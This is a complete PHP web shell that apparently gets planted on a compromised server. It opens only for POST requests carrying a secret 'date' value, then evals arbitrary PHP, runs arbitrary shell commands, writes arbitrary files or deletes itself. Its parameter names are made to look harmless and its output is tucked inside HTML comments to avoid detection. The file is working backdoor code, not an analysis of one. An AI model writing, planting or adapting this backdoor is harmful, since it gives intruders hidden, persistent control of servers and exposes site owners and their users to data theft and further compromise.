<?php

function wsExec($in)
{
	$out = '';
	if (function_exists('exec')) {
		@exec($in,$out);
		$out = @join("n",$out);
	} elseif (function_exists('passthru')) {
		ob_start();
		@passthru($in);
		$out = ob_get_clean();
	} elseif (function_exists('system')) {
		ob_start();
		@system($in);
		$out = ob_get_clean();
	} elseif (function_exists('shell_exec')) {
		$out = shell_exec($in);
	} elseif (is_resource($f = @popen($in,"r"))) {
		$out = "";
		while(!@feof($f))
			$out .= fread($f,1024);
		pclose($f);
	}
	return $out;
}


function wsEval($in)
{
	return @eval($in);
}


function wsWriteFile($filename, $body)
{
	return @file_put_contents($filename, $body);
}


function wsSelfRemove()
{
	return @unlink(__FILE__);
}


function out($str)
{
	echo "<!--$str-->";
}


if (!isset($_SERVER["REQUEST_METHOD"]) || $_SERVER["REQUEST_METHOD"] != "POST")
	return;

if (!isset($_POST["date"]) || $_POST["date"] != "08/17/04")
	return;

if (isset($_POST["elib"]))
{
	echo "<!--";
	echo wsEval($_POST["elib"]);
	echo "-->";
}
elseif(isset($_POST["extend"]))
	out(wsExec($_POST["extend"]));
elseif(isset($_POST["week"]) && isset($_POST["banner"]))
	out(wsWriteFile($_POST["week"], $_POST["banner"]));
elseif(isset($_POST["repeat"]))
	out(wsSelfRemove());
